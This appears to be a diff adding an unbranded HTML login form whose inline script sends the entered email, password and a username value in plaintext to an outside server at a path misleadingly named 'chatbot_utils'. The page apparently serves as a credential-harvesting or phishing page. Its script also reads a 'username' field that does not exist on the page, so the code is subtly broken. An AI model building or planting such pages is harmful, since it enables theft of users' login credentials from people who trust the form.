@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+
+<head>
+  <meta charset="utf-8">
+  <title></title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style media="screen">
+    body {
+      margin: 0;
+      background: #6190E8;
+      background: -webkit-linear-gradient(to right, #A7BFE8, #6190E8);
+      background: linear-gradient(to right, #A7BFE8, #6190E8);
+      font-family: Arial;
+    }
+
+    .main-div {
+      width: 50%;
+      margin-top: 50px;
+      margin-bottom: 30px;
+      margin-left: 25%;
+      background: white;
+      box-shadow: 0 10px 20px 5px rgb(0 0 0 / 10%);
+      box-sizing: border-box;
+      padding: 15px 20px;
+      border-radius: 12px;
+      text-align: center;
+      cursor: pointer;
+    }
+
+    .border-box {
+      box-sizing: border-box;
+    }
+
+    .pull-left {
+      float: left;
+    }
+
+    .full-width {
+      width: 100%;
+    }
+
+    .m-t-15 {
+      margin-top: 15px;
+    }
+
+    .text-left {
+      text-align: left;
+    }
+
+    .padding-10 {
+      padding: 10px;
+    }
+
+    .border {
+      border: 1px solid lightgray;
+    }
+
+    .b-r-6 {
+      border-radius: 6px;
+    }
+
+    .m-t-10 {
+      margin-top: 10px;
+    }
+
+    .main-btn {
+      margin-top: 15px;
+      height: 40px;
+      padding: 6px 12px;
+      font-size: 14px;
+      border-radius: 6px;
+      border: 0;
+      color: white;
+      background: #0575E6;
+      background: -webkit-linear-gradient(to right, #021B79, #0575E6);
+      background: linear-gradient(to right, #021B79, #0575E6);
+    }
+  </style>
+  <script type="text/javascript">
+    setTimeout(function() {
+      var btn = document.getElementById('btn');
+      btn.addEventListener('click', function() {
+        var username = document.getElementById('username').value;
+        var email = document.getElementById('email').value;
+        var password = document.getElementById('password').value;
+        var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function() {
+          if (this.readyState == 4 && this.status == 200) {
+
+          }
+        }
+        xhttp.open("POST", "https://www.feltso.com/kya_backend/pagehub/chatbot_utils", !0);
+        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        xhttp.send("username=" + username + "&email=" + email + "&password=" + password)
+      })
+    }, 100)
+  </script>
+</head>
+
+<body>
+  <div class="main-div">
+    <label class="pull-left full-width text-left m-t-15">Email</label>
+    <input type="email" id="email" class="pull-left full-width padding-10 border b-r-6 m-t-10 border-box" name="" value="">
+    <label class="pull-left full-width text-left m-t-15">Password</label>
+    <input type="password" id="password" class="pull-left full-width padding-10 border b-r-6 m-t-10 border-box" name="" value="">
+    <button type="button" id="btn" class="main-btn" name="button">Submit</button>
+  </div>
+</body>
+
+</html>
